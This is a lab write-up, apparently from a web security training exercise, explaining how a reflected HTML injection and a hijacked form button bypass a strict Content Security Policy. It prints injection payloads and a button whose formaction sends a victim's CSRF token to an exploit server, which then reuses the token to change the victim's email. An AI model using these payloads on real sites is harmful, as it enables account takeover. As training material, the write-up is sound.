# Lab 29: Reflected XSS Protected by Very Strict CSP, with Dangling Markup Attack

## Objective

The goal of this lab was to bypass a strict Content Security Policy using a dangling markup attack, retrieve the victim's CSRF token, and use it to change their email address to `hacker@evil-user.net`.

## Analysis

### 1. Inspecting the email change functionality

The email change functionality sends a POST request to:

```text
/my-account/change-email
```

The request contains two important parameters:

```text
email=...
csrf=...
```

This confirms that a valid CSRF token is required to change the email address.

### 2. Finding the reflected input

The `email` parameter can be supplied through the URL:

```text
/my-account?id=wiener&email=email@inject.com
```

Its value is reflected inside the email input field:

```html
<input required type="email" name="email" value="email@inject.com">
```

Since the input is inserted into an HTML attribute without sufficient protection, it is possible to escape the existing attribute and inject additional HTML.

An initial test payload was:

```html
"><img src="a">
```

The image element was successfully injected, confirming the HTML injection vulnerability.

### 3. Testing clickable HTML injection

The lab requires the simulated victim to click the injected element. An anchor element was therefore tested:

```html
"><a href="https://www.youtube.com">Click me</a>
```

The link was rendered and worked, confirming that clickable HTML elements could be injected.

### 4. Understanding the form hijacking technique

Rather than attempting to load an external JavaScript file or exfiltrate the token through an image, the exploit uses a button with these attributes:

```html
<button
    class="button"
    formaction="EXPLOIT-SERVER"
    formmethod="get"
    type="submit"
>Click me</button>
```

The attributes control how the existing form is submitted:

- `type="submit"` makes the button submit its associated form.
- `formaction` overrides the form's original destination.
- `formmethod="get"` changes the submission method to GET.

Because the injected button is placed inside the existing email-change form, clicking it submits the form's fields to the exploit server instead of the original endpoint.

The CSRF token is consequently included in the URL as a GET parameter.

### 5. Retrieving and reusing the CSRF token

The exploit server hosts a JavaScript payload with two execution paths.

**First stage: Injecting the clickable button**

When the exploit page is opened without a `csrf` parameter, the script redirects the victim to the vulnerable application with an injected button inside the email form.

The button redirects the form submission to the exploit server.

Once clicked, the browser sends the form fields, including the CSRF token, to the exploit server.

**Second stage: Changing the email**

The exploit server receives the submitted form data through the query string. Its response executes the JavaScript payload again, this time with the stolen token available in the URL.

The script retrieves it using:

```javascript
const url = new URL(location);
const csrf = url.searchParams.get('csrf');
```

When the token is available, a new form is created containing:

- The stolen CSRF token.
- The target email address: `hacker@evil-user.net`.

The form is then submitted using POST to:

```text
/my-account/change-email
```

Since the request contains a valid token and is submitted through the victim's authenticated browser context, the application accepts the email change.

## Exploitation

The complete attack sequence is:

1. The victim visits the exploit server.
2. The exploit redirects them to the vulnerable application with an injected button.
3. The victim clicks **Click me**.
4. The existing email form submits its fields to the exploit server using GET.
5. The exploit server receives the victim's CSRF token.
6. The JavaScript payload reuses the token in a POST request to change the email address to `hacker@evil-user.net`.

## Result

Successfully bypassed the strict CSP using a dangling markup and form hijacking technique. The victim's CSRF token was transmitted to the exploit server through a modified form submission and then reused to authorize the email change.

The attack did not require loading an external JavaScript file or image from the vulnerable page.